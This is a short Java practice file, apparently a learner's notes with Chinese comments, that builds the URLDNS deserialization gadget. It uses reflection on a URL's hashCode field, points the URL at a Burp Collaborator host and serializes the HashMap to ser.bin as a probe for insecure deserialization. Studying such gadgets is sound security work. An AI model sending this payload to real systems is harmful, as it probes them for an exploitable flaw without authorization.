import java.io.*;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.HashMap;
import java.util.jar.Attributes.Name;
import java.net.URL;
//import Field;

//import javax.print.DocFlavor.URL;

public class SerializationTest {
    public static void serializa(Object obj) throws IOException {
        // 实例化对象 初始化值
        // 文件输出流 调用方法序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws Exception {
        Person person = new Person("aa", 21);

        // HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>(); // -1 这里不要发起请求
        // hashmap.put(new
        // URL("http://r4wta1klfyly62yvzrq1qarie9k48t.burpcollaborator.net"), 1);
        // 不是-1这里把hashcode改回-1 通过反射 改变对象的属性
        // serializa(hashmap);

        // System.out.println(person);
        // HashMap a = new HashMap<>();
        // 找利用链时 有重写的方法 含有潜在的危险函数 并且还可以反序列化 这就是出现在利用链上的类
        // serializa(person);
        // URL

        HashMap<URL, Integer> hashmap = new HashMap<>();
        URL url = new URL("http://6fmh82bunz6m0cjxzhh8tecz6qch06.burpcollaborator.net");
        Class c = url.getClass();
        Field hashcodefield = c.getDeclaredField("hashCode");
        hashcodefield.setAccessible(true);
        hashcodefield.set(url, 1234);
        hashmap.put(url, 1);
        hashcodefield.set(url, -1);
        serializa(hashmap);

    }
}